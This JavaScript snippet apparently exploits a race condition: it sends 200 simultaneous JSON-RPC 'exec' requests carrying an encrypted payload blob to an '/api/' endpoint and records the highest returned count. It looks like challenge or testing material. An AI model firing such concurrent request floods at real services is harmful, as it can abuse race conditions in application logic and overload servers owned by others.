var apiCall = function(i){ return $.ajax({	
		type:'POST',
		url:"/api/",
		contentType:"application/json",
		dataType:"json",
		processData:!1,
		data:JSON.stringify({
			jsonrpc:"2.0",
			method:"exec",
			params:["payload"],
			id:i
		})
	})
	.then(function(){
		return $.ajax({
				type:'POST',
				url:"/api/",
				contentType:"application/json",
				dataType:"json",
				processData:!1,
				data:JSON.stringify({
					method:"exec",
					step:4,
					message:"",
					params:["U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y96Qsv2Lm+31cmzaAILwytX/z66ZVWEQM/ccf1g+9m5Ubu1+sit+A9cenDxxqkIaxbm4cMeh2oKhqIHhdaBKOi6XX2XDWpa6+P5o9MQw=="]
				})
			})
			.done(function(a, b, c){
				var currentCount= JSON.parse(c.responseText).result.count;
				high = currentCount > high ? currentCount: high;
                return currentCount;		
			})
	});};
var calls = [];
var high = -1;
for(i=0; i < 200; i++){
	calls.push(apiCall(i));
}

$.when.apply($, calls).done(function(){
	console.log('all calls OK')
	console.log(JSON.parse(arguments[99][2].responseText).result.count)
}).catch(function(err){
	console.error('Some / all calls failed')
	console.log('Current count : '+high);
	console.error(err);
});
